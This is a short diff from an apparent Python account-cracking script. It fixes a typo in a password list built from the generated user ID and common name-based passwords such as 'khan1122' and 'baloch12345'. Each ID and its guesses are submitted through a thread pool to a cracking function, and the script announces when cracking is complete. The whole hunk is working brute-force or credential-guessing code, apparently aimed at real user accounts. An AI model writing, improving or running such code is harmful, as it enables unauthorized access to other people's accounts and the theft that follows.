@@ -429,7 +429,7 @@ def random_number1():
 		linex()
 		for guru in uid:
 			uid = kode+guru
-			pwx = [guru,kode,kude+guru,'khankhan','khan12','khan1122','khan786','khan44','khan12','khan1122','khan123456','janjan','jan12345','khan1122','khan12','baloch','malik12','baloch12','baloch12345','malik12345']
+			pwx = [guru,kode,kode+guru,'khankhan','khan12','khan1122','khan786','khan44','khan12','khan1122','khan123456','janjan','jan12345','khan1122','khan12','baloch','malik12','baloch12','baloch12345','malik12345']
 			yaari.submit(fcrack,uid,pwx,tl)
 	linex()
 	print('[✓] Crack process has been completed')
